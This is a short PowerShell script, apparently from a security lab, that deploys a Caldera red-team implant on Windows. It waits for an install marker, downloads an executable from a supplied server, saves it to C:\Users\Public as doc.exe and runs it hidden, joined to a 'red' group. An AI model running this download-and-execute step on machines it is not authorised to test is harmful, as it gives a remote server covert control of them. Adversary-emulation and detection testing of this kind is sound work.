param (
    [string]$calderaDomain = $(throw "-calderaDomain is required."),
 )
# File to deploy Caldera implant
$calderaLogfile = "c:\Elastic\caldera.log"
write-host "Still waiting for install to finish" | Out-File $calderaLogfile -Append
do {
    sleep 10
    }
while ((Test-Path C:\Users\Administrator\Desktop\done.txt) -eq $false)

$server=$calderaDomain;$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);$name="doc";get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;rm -force "C:\Users\Public\$name.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;